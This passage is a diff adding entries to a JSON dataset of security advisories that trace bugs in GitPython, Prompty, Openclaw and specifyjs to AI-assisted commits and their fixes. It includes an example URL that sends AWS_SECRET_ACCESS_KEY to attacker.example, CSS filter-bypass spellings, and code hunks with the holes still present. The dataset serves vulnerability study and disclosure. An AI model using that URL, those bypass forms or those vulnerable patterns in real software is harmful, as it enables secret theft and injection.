+   "case_id": "GHSA-94P4-4CQ8-9G67",
+   "aliases": [],
+   "repository": "gitpython-developers/gitpython",
+   "repository_metadata": {
+    "full_name": "gitpython-developers/gitpython",
+    "language": "Python",
+    "archived": false
+   },
+   "contribution_class": "AI_INCOMPLETE_REMEDIATION",
+   "candidate_set": [
+    "8ac5a30519b6f4af85398b9b9d7064ff4d452da2"
+   ],
+   "carrier_set": [],
+   "minimum_fix_set": [
+    "863417457a0633db7ea5aed4fd01e0b291a41162"
+   ],
+   "gates": {
+    "ai_hunk": "PASS",
+    "but_for": "PASS",
+    "fix_reversal": "PASS",
+    "identity": "PASS",
+    "release": "PASS",
+    "topology": "PASS",
+    "uniqueness": "PASS"
+   },
+   "vulnerable_release": {
+    "contains_candidate_ancestor": true,
+    "contains_fix_ancestor": false,
+    "kind": "git_tag",
+    "sha": "f8b6df5f10033508b5f5dd26f3ab4a87b215c3ca",
+    "tag": "3.1.52"
+   },
+   "fixed_release": {
+    "contains_fix_ancestor": true,
+    "kind": "git_tag",
+    "sha": "681c82c9c296f934635c81fa8294d4b6b6791b7e",
+    "tag": "3.1.55"
+   },
+   "published_at": "2026-07-24",
+   "severity": null,
+   "cwes": [],
+   "description": "The advisory covers the second half of a two-part boundary. The previous release had removed environment-variable expansion from clone URLs, and the change that did so introduced the switch which made the removal possible. That switch left expansion enabled for every caller that did not opt out, and only the clone path opted out, so Remote.create, reached through Repo.create_remote and its Remote.add alias, and Submodule.add still normalized caller-supplied URLs with expansion on. A URL such as http://attacker.example/${AWS_SECRET_ACCESS_KEY}/repo.git was written into .git/config with the secret substituted, and the next fetch or pull transmitted it to the attacker's host; the submodule path also wrote the expanded value into the tracked .gitmodules file. The completing change passes expand_vars=False at those two remaining callers, so configuration keeps the literal URL and protocol validation sees the same bytes Git receives.",
+   "references": [],
+   "mechanism": "The AI change added an expand_vars switch to the shared URL helper with expansion still on by default and turned it off only on the clone path, so create_remote and submodule URLs were still written into git configuration after os.path.expandvars had replaced ${...} references with process environment values; the completing change passes the switch at those two remaining callers.",
+   "cause_category": "other_ambiguous",
+   "ai_provenance": {
+    "family": "openai_gpt_codex",
+    "coverage": "complete",
+    "candidate_count": 1,
+    "named_candidate_count": 1
+   },
+   "fix_authorship": {
+    "classification": "ai_assisted",
+    "families": [
+     "openai_gpt_codex"
+    ],
+    "fixes": [
+     {
+      "sha": "863417457a0633db7ea5aed4fd01e0b291a41162",
+      "classification": "ai_assisted",
+      "author": {
+       "name": "GPT 5.6",
+       "email": "codex@openai.com"
+      }
+     }
+    ]
+   },
+   "code_evidence": {
+    "advisory_url": "https://github.com/advisories/ghsa-94p4-4cq8-9g67",
+    "candidate_patch_sha256": "c999116c16354b54775407ac66406b969feb6fb5069c1cee12b4fa5e67084753",
+    "candidate_url": "https://github.com/gitpython-developers/gitpython/commit/8ac5a30519b6f4af85398b9b9d7064ff4d452da2",
+    "display_hunks": [
+     {
+      "annotation": "The AI change adds the expand_vars switch with the default left on, so every caller that was not updated still runs its URL text through os.path.expandvars before the value reaches git configuration.",
+      "code": "@@ -903,29 +903,34 @@ class Git(metaclass=_GitMeta):\n \n     @overload\n     @classmethod\n-    def polish_url(cls, url: str, is_cygwin: Literal[False] = ...) -> str: ...\n+    def polish_url(cls, url: str, is_cygwin: Literal[False] = ..., expand_vars: bool = ...) -> str: ...\n \n     @overload\n     @classmethod\n-    def polish_url(cls, url: str, is_cygwin: Union[None, bool] = None) -> str: ...\n+    def polish_url(cls, url: str, is_cygwin: Union[None, bool] = None, expand_vars: bool = True) -> str: ...\n \n     @classmethod\n-    def polish_url(cls, url: str, is_cygwin: Union[None, bool] = None) -> PathLike:\n+    def polish_url(cls, url: str, is_cygwin: Union[None, bool] = None, expand_vars: bool = True) -> PathLike:\n         \"\"\"Remove any backslashes from URLs to be written in config files.\n \n         Windows might create config files containing paths with backslashes, but git\n         stops liking them as it will escape the backslashes. Hence we undo the escaping\n         just to be sure.\n+\n+        :param expand_vars:\n+            Expand environment variables and an initial ``~``. Disable this for values\n+            obtained from an untrusted source, such as remote URLs.\n         \"\"\"\n         if is_cygwin is None:\n             is_cygwin = cls.is_cygwin()\n \n         if is_cygwin:\n-            url = cygpath(url)\n+            url = cygpath(url, expand_vars=expand_vars)\n         else:\n-            url = os.path.expandvars(url)\n-            if url.startswith(\"~\"):\n-                url = os.path.expanduser(url)\n+            if expand_vars:\n+                url = os.path.expandvars(url)\n+                if url.startswith(\"~\"):\n+                    url = os.path.expanduser(url)\n             url = url.replace(\"\\\\\\\\\", \"\\\\\").replace(\"\\\\\", \"/\")\n         return url\n ",
+      "file": "git/cmd.py",
+      "role": "candidate"
+     },
+     {
+      "annotation": "Only the clone path opts out in this change: the clone URL and the stored origin are normalized with expand_vars=False, while the remote creation and submodule callers keep the expanding default.",
+      "code": "@@ -1452,8 +1452,9 @@ class Repo:\n         if multi_options:\n             multi = shlex.split(\" \".join(multi_options))\n \n+        clone_url = Git.polish_url(url, expand_vars=False)\n         if not allow_unsafe_protocols:\n-            Git.check_unsafe_protocols(url)\n+            Git.check_unsafe_protocols(clone_url)\n         if not allow_unsafe_options:\n             Git.check_unsafe_options(\n                 options=Git._option_candidates([], kwargs),\n@@ -1465,7 +1466,7 @@ class Repo:\n         proc = git.clone(\n             multi,\n             \"--\",\n-            Git.polish_url(url),\n+            clone_url,\n             clone_path,\n             with_extended_output=True,\n             as_process=True,\n@@ -1505,7 +1506,7 @@ class Repo:\n         # escape the backslashes. Hence we undo the escaping just to be sure.\n         if repo.remotes:\n             with repo.remotes[0].config_writer as writer:\n-                writer.set_value(\"url\", Git.polish_url(repo.remotes[0].url))\n+                writer.set_value(\"url\", Git.polish_url(repo.remotes[0].url, expand_vars=False))\n         # END handle remote repo\n         return repo\n ",
+      "file": "git/repo/base.py",
+      "role": "candidate"
+     },
+     {
+      "annotation": "The completing fix flips the remote creation call to expand_vars=False, so the URL written into .git/config keeps its literal ${...} references instead of substituted environment values.",
+      "code": "@@ -808,7 +808,7 @@ class Remote(LazyMixin, IterableObj):\n         \"\"\"\n         scmd = \"add\"\n         kwargs[\"insert_kwargs_after\"] = scmd\n-        url = Git.polish_url(url)\n+        url = Git.polish_url(url, expand_vars=False)\n         if not allow_unsafe_protocols:\n             Git.check_unsafe_protocols(url)\n         repo.git.remote(scmd, \"--\", name, url, **kwargs)",
+      "file": "git/remote.py",
+      "role": "fix"
+     },
+     {
+      "annotation": "The same switch is passed at the submodule call site, closing the path that wrote the expanded URL into the tracked .gitmodules file.",
+      "code": "@@ -608,7 +608,7 @@ class Submodule(IndexObject, TraversableIterableObj):\n         # END verify url\n \n         ## See #525 for ensuring git URLs in config-files are valid under Windows.\n-        url = Git.polish_url(url)\n+        url = Git.polish_url(url, expand_vars=False)\n \n         # It's important to add the URL to the parent config, to let `git submodule` know.\n         # Otherwise there is a '-' character in front of the submodule listing:",
+      "file": "git/objects/submodule/base.py",
+      "role": "fix"
+     }
+    ],
+    "fix_patch_sha256": "d71616a364050ace070666a0c90f9df33e5e3490dad2a24e73d455d2ea01e751",
+    "fix_url": "https://github.com/gitpython-developers/gitpython/commit/863417457a0633db7ea5aed4fd01e0b291a41162",
+    "steps": [
+     {
+      "detail": "The hardening pass that removed expansion from clone URLs added an expand_vars switch to the shared URL helper and turned it off only on the clone path, leaving the permissive default in place for every other caller.",
+      "title": "AI change"
+     },
+     {
+      "detail": "The completing change passes expand_vars=False from the remote creation and submodule add call sites, so those stored URLs keep their literal ${...} text instead of carrying substituted secrets.",
+      "title": "Fix"
+     }
+    ],
+    "summary": "An AI-assisted change stopped environment expansion on clone URLs but left the same expansion in the remote and submodule callers, so a URL passed to create_remote or add could embed the hosting process's secrets and carry them to the attacker's host."
+   },
+   "ir_chain": {
+    "original_advisory_ids": [
+     "GHSA-RWJ8-PGH3-R573"
+    ],
+    "original_mechanism": "Git.polish_url() ran os.path.expandvars() over every URL it was handed, so a caller-supplied clone URL carrying $NAME or ${NAME} tokens had the hosting process's environment expanded into it.",
+    "original_sink": "Git.polish_url() in git/cmd.py, reached from Repo.clone_from()",
+    "original_author_kind": "AI",
+    "original_author_name": "GPT 5.6",
+    "original_sha": "8ac5a30519b6f4af85398b9b9d7064ff4d452da2",
+    "unresolved_reason": null,
+    "attempted_remediation": {
+     "candidate_shas": [
+      "8ac5a30519b6f4af85398b9b9d7064ff4d452da2"
+     ],
+     "changed": "Added an expand_vars switch to polish_url and opted the clone path out of expansion (the clone URL and the stored origin are passed with expand_vars=False).",
+     "missed": "Left the remote path on the expanding default: git/remote.py still called Git.polish_url(url), so Remote.add() and Repo.create_remote() expanded environment variables."
+    },
+    "residual_bypass": "A remote URL added through Remote.add() or Repo.create_remote() still had environment variables expanded into it, so a hosting-process secret could be sent to the attacker-named host.",
+    "final_closure": {
+     "closed": "Flipped the two remaining callers, git/remote.py and git/objects/submodule/base.py, to polish_url(url, expand_vars=False).",
+     "minimum_fix_shas": [
+      "863417457a0633db7ea5aed4fd01e0b291a41162"
+     ]
+    }
+   },
+   "unpatched": null,
+   "advisory_url": "https://github.com/gitpython-developers/gitpython/security/advisories/GHSA-3WXW-XV34-2FRG",
    "publication_issues": [],
    "publication_status": "confirmed"
   },
@@ -10318,6 +10359,113 @@
    "ir_chain": null,
    "unpatched": null,
    "advisory_url": "https://github.com/advisories/GHSA-wxhm-2mq7-7697",
+   "publication_issues": [],
+   "publication_status": "confirmed"
+  },
+  {
+   "case_id": "GHSA-C4GH-RV8H-Q9VW",
+   "aliases": [
+    "CVE-2026-53597"
+   ],
+   "repository": "microsoft/prompty",
+   "repository_metadata": {
+    "full_name": "microsoft/prompty",
+    "language": "TypeScript",
+    "archived": false
+   },
+   "contribution_class": "AI_DIRECT_ROOT",
+   "candidate_set": [
+    "a0e6108842a3bfc840a33db819a4415fbdac333d"
+   ],
+   "carrier_set": [],
+   "minimum_fix_set": [
+    "c27402da2487075be577f06aa79df627fb9d6853"
+   ],
+   "gates": {
+    "ai_hunk": "PASS",
+    "but_for": "PASS",
+    "fix_reversal": "PASS",
+    "identity": "PASS",
+    "release": "PASS",
+    "topology": "PASS",
+    "uniqueness": "PASS"
+   },
+   "vulnerable_release": {
+    "contains_candidate_ancestor": true,
+    "contains_fix_ancestor": false,
+    "kind": "git_tag",
+    "sha": "88ac9948d7d37995edbb2f6d36913436626c39e1",
+    "tag": "typescript/2.0.0-beta.2"
+   },
+   "fixed_release": {
+    "contains_fix_ancestor": true,
+    "kind": "git_tag",
+    "sha": "c27402da2487075be577f06aa79df627fb9d6853",
+    "tag": "typescript/2.0.0-beta.3"
+   },
+   "published_at": "2026-07-17",
+   "severity": null,
+   "cwes": [],
+   "description": "The TypeScript Prompty loader reads a .prompty file, splits its frontmatter from the markdown body and builds a typed prompt object. The split used gray-matter with its default engine set, which treats a frontmatter block opened with ---js as JavaScript and evaluates it. The file being parsed is the attacker-controlled artifact, so a prompt file from an untrusted source executed code with the privileges of the Node.js host process at load time, before any template rendering happened. The repair hands gray-matter an explicit engines map whose js and javascript entries throw, so executable frontmatter is refused rather than evaluated, and the accompanying regression test writes a ---js prompt that tries to create a file and then asserts the file never appears.",
+   "references": [],
+   "mechanism": "The parsing step called gray-matter without an engines override, and gray-matter's defaults include a JavaScript engine that evaluates a frontmatter block opened with ---js. Any .prompty file taken from a shared prompt bundle, a user-supplied path or an LLM-generated prompt therefore ran code inside the loading Node.js process before rendering. The repair passes an explicit engines map that replaces the js and javascript parsers with a function that throws, and a regression test asserts the block is rejected and its payload never runs.",
+   "cause_category": "other_ambiguous",
+   "ai_provenance": {
+    "family": "copilot",
+    "coverage": "complete",
+    "candidate_count": 1,
+    "named_candidate_count": 1
+   },
+   "fix_authorship": {
+    "classification": "ai_assisted",
+    "families": [
+     "copilot"
+    ],
+    "fixes": [
+     {
+      "sha": "c27402da2487075be577f06aa79df627fb9d6853",
+      "classification": "ai_assisted",
+      "author": {
+       "name": "Seth Juarez",
+       "email": "me@sethjuarez.com"
+      }
+     }
+    ]
+   },
+   "code_evidence": {
+    "advisory_url": "https://github.com/advisories/ghsa-c4gh-rv8h-q9vw",
+    "candidate_url": "https://github.com/microsoft/prompty/commit/a0e6108842a3bfc840a33db819a4415fbdac333d",
+    "display_hunks": [
+     {
+      "annotation": "The new TypeScript loader imported gray-matter and split the frontmatter with the library's default engines, so the parsing step placed no restriction on executable frontmatter.",
+      "code": "@@ -0,0 +14,1 @@ import block of the new file\n+import matter from \"gray-matter\";\n@@ -0,0 +39,2 @@ the new file, frontmatter split in buildAgent\n+  // 1. Split frontmatter + body\n+  const { data, content } = matter(raw);",
+      "file": "runtime/typescript/prompty/src/core/loader.ts",
+      "role": "candidate"
+     },
+     {
+      "annotation": "The repair replaces both JavaScript frontmatter parsers with a function that throws, so a JavaScript frontmatter block is rejected instead of being evaluated while the prompt file is parsed.",
+      "code": "@@ -79,7 +79,12 @@ export function defaultSaveContext(\n \n function buildAgent(raw: string, filePath: string, options: LoadOptions): Prompty {\n   // 1. Split frontmatter + body\n-  const { data, content } = matter(raw);\n+  const { data, content } = matter(raw, {\n+    engines: {\n+      js: { parse: rejectExecutableFrontmatter },\n+      javascript: { parse: rejectExecutableFrontmatter },\n+    },\n+  });\n \n   // If there's a body (instructions), merge it in\n   const frontmatter: Record<string, unknown> = data ?? {};\n@@ -102,6 +107,10 @@ function buildAgent(raw: string, filePath: string, options: LoadOptions): Prompt\n   return agent;\n }\n \n+function rejectExecutableFrontmatter(): never {\n+  throw new Error(\"JavaScript frontmatter is not supported in .prompty files\");\n+}\n+\n // ---------------------------------------------------------------------------\n // Reference resolution via preProcess\n // ---------------------------------------------------------------------------",
+      "file": "runtime/typescript/packages/core/src/core/loader.ts",
+      "role": "fix"
+     }
+    ],
+    "fix_marker": "Co-authored-by: Copilot <223556219+Copilot@users.noreply.github.com>",
+    "fix_url": "https://github.com/microsoft/prompty/commit/c27402da2487075be577f06aa79df627fb9d6853",
+    "steps": [
+     {
+      "detail": "The Copilot-coauthored TypeScript runtime added the loader that split .prompty frontmatter with gray-matter's default engines, which left the library free to evaluate a JavaScript frontmatter block.",
+      "title": "AI change"
+     },
+     {
+      "detail": "The loader now passes an explicit engines map that replaces the js and javascript parsers with a function that throws, so executable frontmatter is rejected before it can run.",
+      "title": "AI-assisted fix"
+     }
+    ],
+    "summary": "A Copilot-assisted TypeScript runtime loaded .prompty files through gray-matter with the library's default frontmatter engines, so a file that opened with a JavaScript frontmatter block ran its code during parsing. The repair rejects JavaScript frontmatter outright."
+   },
+   "ir_chain": null,
+   "unpatched": null,
+   "advisory_url": "https://github.com/advisories/ghsa-c4gh-rv8h-q9vw",
    "publication_issues": [],
    "publication_status": "confirmed"
   },
@@ -12726,6 +12874,146 @@
    "publication_status": "qualified"
   },
   {
+   "case_id": "GHSA-QJPC-QF9M-XWMR",
+   "aliases": [],
+   "repository": "openclaw/openclaw",
+   "repository_metadata": {
+    "full_name": "openclaw/openclaw",
+    "language": "TypeScript",
+    "archived": false
+   },
+   "contribution_class": "AI_INCOMPLETE_REMEDIATION",
+   "candidate_set": [
+    "20523b918adff4feae378ac9965e204c56b6e3d8"
+   ],
+   "carrier_set": [],
+   "minimum_fix_set": [
+    "96fba91b3a51d6e536f03a4077ef8a11a132578d"
+   ],
+   "gates": {
+    "ai_hunk": "PASS",
+    "but_for": "PASS",
+    "fix_reversal": "PASS",
+    "identity": "PASS",
+    "release": "PASS",
+    "topology": "PASS",
+    "uniqueness": "PASS"
+   },
+   "vulnerable_release": {
+    "contains_candidate_ancestor": true,
+    "contains_fix_ancestor": false,
+    "kind": "git_tag",
+    "sha": "f066dd2f31c231f38fbcaacd6f6dfce0801143b3",
+    "tag": "v2026.5.12"
+   },
+   "fixed_release": {
+    "contains_fix_ancestor": true,
+    "kind": "git_tag",
+    "sha": "50a2481652b6a62d573ece3cead60400dc77020d",
+    "tag": "v2026.5.18"
+   },
+   "published_at": "2026-07-02",
+   "severity": null,
+   "cwes": [],
+   "description": "Openclaw's gateway can authenticate Control UI sessions through a reverse proxy, and in that mode a client still has to pair a device before the scopes it asks for are trusted. A change shipped in 2026.2.24 made a successful trusted-proxy authentication sufficient to skip pairing and to satisfy the missing-device-identity check, so a connection that presented a fresh, unpaired device identity could request elevated operator scopes and keep them, up to cached operator-admin authority over live gateway calls. A role gate added days later limited the same bypass to operator-role sessions, which left this operator-role scope-binding flaw on the same code path. Release 2026.5.18 removes the proxy pairing bypass, requires pairing before proxy-scoped access, clears unbound scopes and stops issuing device tokens without a paired device identity.",
+   "references": [],
+   "mechanism": "Trusted-proxy Control UI connections were allowed to skip device pairing, so the gateway honored the operator scopes a client declared on its WebSocket connect request before any device identity or pairing baseline was bound to the connection. The connection policy returned a pairing bypass whenever trusted-proxy authentication succeeded, the missing-device-identity check answered allow for the same condition, and the client's declared scopes survived, which let an unpaired or restricted user exercise admin-gated gateway calls for the life of the connection. The repair drops the proxy pairing bypass, requires pairing before proxy-scoped access, clears self-declared scopes when no device identity exists, and stops issuing device tokens on that path.",
+   "cause_category": "auth_access",
+   "ai_provenance": {
+    "family": "cursor",
+    "coverage": "complete",
+    "candidate_count": 1,
+    "named_candidate_count": 1
+   },
+   "fix_authorship": {
+    "classification": "no_ai_marker",
+    "families": [],
+    "fixes": [
+     {
+      "sha": "96fba91b3a51d6e536f03a4077ef8a11a132578d",
+      "classification": "no_ai_marker",
+      "author": {
+       "name": "Pavan Kumar Gondhi",
+       "email": "pavangondhi@gmail.com"
+      }
+     }
+    ]
+   },
+   "code_evidence": {
+    "advisory_url": "https://github.com/advisories/ghsa-qjpc-qf9m-xwmr",
+    "candidate_patch_sha256": "ccc9db4f3cda502cbd361ad6af12cb5126fc7f0475118a5a4977e2f2845fd3ab",
+    "candidate_url": "https://github.com/openclaw/openclaw/commit/20523b918adff4feae378ac9965e204c56b6e3d8",
+    "display_hunks": [
+     {
+      "annotation": "Successful trusted-proxy authentication made the pairing decision return skip and let a connection without device identity pass, so the operator scopes a client declared were trusted before pairing bound them.",
+      "code": "@@ -35,7 +35,11 @@ export function resolveControlUiAuthPolicy(params: {\n export function shouldSkipControlUiPairing(\n   policy: ControlUiAuthPolicy,\n   sharedAuthOk: boolean,\n+  trustedProxyAuthOk = false,\n ): boolean {\n+  if (trustedProxyAuthOk) {\n+    return true;\n+  }\n   return policy.allowBypass && sharedAuthOk;\n }\n \n@@ -50,6 +54,7 @@ export function evaluateMissingDeviceIdentity(params: {\n   role: GatewayRole;\n   isControlUi: boolean;\n   controlUiAuthPolicy: ControlUiAuthPolicy;\n+  trustedProxyAuthOk?: boolean;\n   sharedAuthOk: boolean;\n   authOk: boolean;\n   hasSharedAuth: boolean;\n@@ -58,6 +63,9 @@ export function evaluateMissingDeviceIdentity(params: {\n   if (params.hasDeviceIdentity) {\n     return { kind: \"allow\" };\n   }\n+  if (params.isControlUi && params.trustedProxyAuthOk) {\n+    return { kind: \"allow\" };\n+  }\n   if (params.isControlUi && !params.controlUiAuthPolicy.allowBypass) {\n     // Allow localhost Control UI connections when allowInsecureAuth is configured.\n     // Localhost has no network interception risk, and browser SubtleCrypto\n",
+      "file": "src/gateway/server/ws-connection/connect-policy.ts",
+      "role": "candidate"
+     },
+     {
+      "annotation": "The handler derived the trusted-proxy predicate from authentication success alone and fed it into both the pairing decision and the missing-device-identity check.",
+      "code": "@@ -427,11 +427,17 @@ export function attachGatewayWsMessageHandler(params: {\n           if (!device) {\n             clearUnboundScopes();\n           }\n+          const trustedProxyAuthOk =\n+            isControlUi &&\n+            resolvedAuth.mode === \"trusted-proxy\" &&\n+            authOk &&\n+            authMethod === \"trusted-proxy\";\n           const decision = evaluateMissingDeviceIdentity({\n             hasDeviceIdentity: Boolean(device),\n             role,\n             isControlUi,\n             controlUiAuthPolicy,\n+            trustedProxyAuthOk,\n             sharedAuthOk,\n             authOk,\n             hasSharedAuth,\n@@ -563,8 +569,13 @@ export function attachGatewayWsMessageHandler(params: {\n         // In that case, don't force device pairing on first connect.\n         const skipPairingForOperatorSharedAuth =\n           role === \"operator\" && sharedAuthOk && !isControlUi && !isWebchat;\n+        const trustedProxyAuthOk =\n+          isControlUi &&\n+          resolvedAuth.mode === \"trusted-proxy\" &&\n+          authOk &&\n+          authMethod === \"trusted-proxy\";\n         const skipPairing =\n-          shouldSkipControlUiPairing(controlUiAuthPolicy, sharedAuthOk) ||\n+          shouldSkipControlUiPairing(controlUiAuthPolicy, sharedAuthOk, trustedProxyAuthOk) ||\n           skipPairingForOperatorSharedAuth;\n         if (device && devicePublicKey && !skipPairing) {\n           const formatAuditList = (items: string[] | undefined): string => {\n",
+      "file": "src/gateway/server/ws-connection/message-handler.ts",
+      "role": "candidate"
+     },
+     {
+      "annotation": "The repair deletes the early return and the scope exemption, so a proxy-authenticated connection must pair before its scopes are honored and unbound scopes are cleared again.",
+      "code": "@@ -37,13 +37,10 @@ export function resolveControlUiAuthPolicy(params: {\n export function shouldSkipControlUiPairing(\n   policy: ControlUiAuthPolicy,\n   role: GatewayRole,\n-  trustedProxyAuthOk = false,\n+  _trustedProxyAuthOk = false,\n   authMode?: string,\n   authMethod?: string,\n ): boolean {\n-  if (trustedProxyAuthOk) {\n-    return true;\n-  }\n   if (policy.isControlUi && role === \"operator\" && authMethod === \"tailscale\" && policy.device) {\n     return true;\n   }\n@@ -96,9 +93,6 @@ export function shouldClearUnboundScopesForMissingDeviceIdentity(params: {\n     params.decision.kind !== \"allow\" ||\n     (!params.controlUiAuthPolicy.allowBypass &&\n       !params.preserveInsecureLocalControlUiScopes &&\n-      params.trustedProxyAuthOk !== true &&\n-      // trusted-proxy auth can bypass pairing for some clients, but those\n-      // self-declared scopes are still unbound without device identity.\n       (params.authMethod === \"token\" ||\n         params.authMethod === \"password\" ||\n         params.authMethod === \"trusted-proxy\"))\n",
+      "file": "src/gateway/server/ws-connection/connect-policy.ts",
+      "role": "fix"
+     },
+     {
+      "annotation": "Device-token issuance is now gated on the absence of trusted-proxy authentication, so a live proxy connection cannot obtain a token without a paired device identity.",
+      "code": "@@ -1285,8 +1285,9 @@ export function attachGatewayWsMessageHandler(params: GatewayWsMessageHandlerPar\n           }\n         }\n \n+        const shouldIssueDeviceToken = !trustedProxyAuthOk;\n         const deviceToken =\n-          device && hasServerApprovedDeviceTokenBaseline\n+          shouldIssueDeviceToken && device && hasServerApprovedDeviceTokenBaseline\n             ? await ensureDeviceToken({ deviceId: device.id, role, scopes })\n             : null;\n         const bootstrapDeviceTokens: Array<{\n",
+      "file": "src/gateway/server/ws-connection/message-handler.ts",
+      "role": "fix"
+     }
+    ],
+    "fix_patch_sha256": "73bbdf81133ae30c198e9c4dd0c67546f6896caa74560a7baceae59dcd8d2247",
+    "fix_url": "https://github.com/openclaw/openclaw/commit/96fba91b3a51d6e536f03a4077ef8a11a132578d",
+    "steps": [
+     {
+      "detail": "The change that let trusted-proxy authentication skip device pairing added the proxy arm to the pairing decision, the early return that made any trusted-proxy Control UI connection pairing-bypass eligible, and the matching allow in the missing-device-identity check. Its message ends with a Cursor co-author trailer.",
+      "title": "AI change"
+     },
+     {
+      "detail": "The repair removes the pairing bypass and the scope exemption, clears self-declared scopes when no device identity exists, and stops issuing device tokens on the trusted-proxy path, so pairing now comes before proxy-scoped access.",
+      "title": "Fix"
+     }
+    ],
+    "summary": "Openclaw 2026.2.24 through 2026.5.12 treated successful trusted-proxy authentication as enough to skip device pairing, so a restricted or unpaired Control UI client could keep the operator scopes it declared on connect and use admin-only gateway calls on that connection; 2026.5.18 requires pairing first."
+   },
+   "ir_chain": {
+    "original_advisory_ids": [
+     "GHSA-QJPC-QF9M-XWMR"
+    ],
+    "original_mechanism": "A Control UI session behind a trusted reverse proxy still had to complete device pairing before its requested scopes were trusted, which is the behaviour issue #25293 asked to change.",
+    "original_sink": "websocket connect policy in src/gateway/server/ws-connection/connect-policy.ts and message-handler.ts",
+    "original_author_kind": "AI",
+    "original_author_name": "Cursor",
+    "original_sha": "20523b918adff4feae378ac9965e204c56b6e3d8",
+    "unresolved_reason": null,
+    "attempted_remediation": {
+     "candidate_shas": [
+      "20523b918adff4feae378ac9965e204c56b6e3d8"
+     ],
+     "changed": "Let a successful trusted-proxy authentication skip device pairing: shouldSkipControlUiPairing returned true, the missing-device-identity check answered allow, and the scopes the client declared on connect survived.",
+     "missed": "Dropped the pairing baseline for scope binding on the whole trusted-proxy path; the role gate added two days later (ec45c317, requiring role === 'operator') narrowed the bypass and left the same pre-pairing path open for operator-role sessions."
+    },
+    "residual_bypass": "An unpaired operator-role Control UI session behind a trusted proxy kept the scopes it declared on connect and could exercise admin-gated gateway calls; v2026.5.12 still carried the pairing-skip early return, the scope exemption and the allow.",
+    "final_closure": {
+     "closed": "Removed the proxy pairing bypass, required pairing before proxy-scoped access, cleared unbound scopes and stopped issuing device tokens without a paired device identity.",
+     "minimum_fix_shas": [
+      "96fba91b3a51d6e536f03a4077ef8a11a132578d"
+     ]
+    }
+   },
+   "unpatched": null,
+   "advisory_url": "https://github.com/advisories/ghsa-qjpc-qf9m-xwmr",
+   "publication_issues": [],
+   "publication_status": "confirmed"
+  },
+  {
    "case_id": "GHSA-QCR8-X557-7CP3",
    "aliases": [],
    "repository": "asymmetric-effort/specifyjs",
@@ -13384,6 +13672,146 @@
    "publication_status": "confirmed"
   },
   {
+   "case_id": "GHSA-93Q6-WWJH-JC6H",
+   "aliases": [
+    "CVE-2026-50290"
+   ],
+   "repository": "asymmetric-effort/specifyjs",
+   "repository_metadata": {
+    "full_name": "asymmetric-effort/specifyjs",
+    "language": "TypeScript",
+    "archived": false
+   },
+   "contribution_class": "AI_INCOMPLETE_REMEDIATION",
+   "candidate_set": [
+    "caa8fbfa4d7d99e02dca3ee0df642b30a5d856cc"
+   ],
+   "carrier_set": [],
+   "minimum_fix_set": [
+    "25d1fb491d99479efdf501f5f75e0bb80c908f0a",
+    "293124c51bf797c0f5cdae32981110545850a893"
+   ],
+   "gates": {
+    "ai_hunk": "PASS",
+    "but_for": "PASS",
+    "fix_reversal": "PASS",
+    "identity": "PASS",
+    "release": "PASS",
+    "topology": "PASS",
+    "uniqueness": "PASS"
+   },
+   "vulnerable_release": {
+    "contains_candidate_ancestor": true,
+    "contains_fix_ancestor": false,
+    "kind": "git_tag",
+    "sha": "a84103e7dc3e3283279058d8f7e5a3c01a79fa3d",
+    "tag": "v0.2.135"
+   },
+   "fixed_release": {
+    "contains_fix_ancestor": true,
+    "kind": "git_tag",
+    "sha": "25d1fb491d99479efdf501f5f75e0bb80c908f0a",
+    "tag": "v0.2.136"
+   },
+   "published_at": "2026-07-02",
+   "severity": null,
+   "cwes": [],
+   "description": "The pre-rendering server serializes component style objects into the style attribute of the generated HTML. Before version 0.2.136 the serializer deleted the exact substrings expression( and url(javascript: from a value and emitted whatever remained, which left escape forms such as \\65xpression( and comment-split forms such as exp/**/ression( untouched, while browsers decode both of them back to the dangerous keyword. A component that passed untrusted text into a style value could therefore still deliver an expression or a javascript URL to clients, and version 0.2.136 replaces the strip with a check that normalizes unicode escapes and removes comments before matching dangerous patterns.",
+   "references": [],
+   "mechanism": "The style serializer removed only the literal dangerous substrings from each value, leaving every other spelling of the same payload intact, so a value written with CSS unicode escapes or a comment between letters decoded back into a live expression or javascript URL in browsers that honor them.",
+   "cause_category": "other_ambiguous",
+   "ai_provenance": {
+    "family": "claude",
+    "coverage": "complete",
+    "candidate_count": 1,
+    "named_candidate_count": 1
+   },
+   "fix_authorship": {
+    "classification": "ai_assisted",
+    "families": [
+     "claude"
+    ],
+    "fixes": [
+     {
+      "sha": "25d1fb491d99479efdf501f5f75e0bb80c908f0a",
+      "classification": "ai_assisted",
+      "author": {
+       "name": "Sam Caldwell",
+       "email": "github@samcaldwell.net"
+      }
+     },
+     {
+      "sha": "293124c51bf797c0f5cdae32981110545850a893",
+      "classification": "ai_assisted",
+      "author": {
+       "name": "Sam Caldwell",
+       "email": "github@samcaldwell.net"
+      }
+     }
+    ]
+   },
+   "code_evidence": {
+    "advisory_url": "https://github.com/advisories/ghsa-93q6-wwjh-jc6h",
+    "candidate_url": "https://github.com/asymmetric-effort/specifyjs/commit/caa8fbfa4d7d99e02dca3ee0df642b30a5d856cc",
+    "display_hunks": [
+     {
+      "annotation": "These added lines delete the literal spellings of the two dangerous patterns, which is exactly the guard the advisory describes as bypassable.",
+      "code": "@@ -276,11 +279,16 @@ function renderStyle(style: Record<string, string | number>): string {\n \n     // Convert camelCase to kebab-case\n     const cssProp = prop.replace(/[A-Z]/g, (m) => `-${m.toLowerCase()}`);\n-    const cssValue =\n+    let cssValue =\n       typeof value === 'number' && value !== 0 && !isUnitlessProp(prop)\n         ? `${value}px`\n         : String(value);\n \n+    // L-6: Sanitize CSS values — strip dangerous patterns\n+    cssValue = cssValue\n+      .replace(/expression\\s*\\(/gi, '')\n+      .replace(/url\\s*\\(\\s*javascript:/gi, 'url(');\n+\n     parts.push(`${cssProp}:${cssValue}`);\n   }\n   return parts.join(';');",
+      "file": "core/src/server/render-to-string.ts",
+      "role": "candidate"
+     },
+     {
+      "annotation": "The replacement normalizes escape sequences and strips comments before matching, and it clears the value when a dangerous pattern is found, so the spellings that defeated the earlier strip are rejected.",
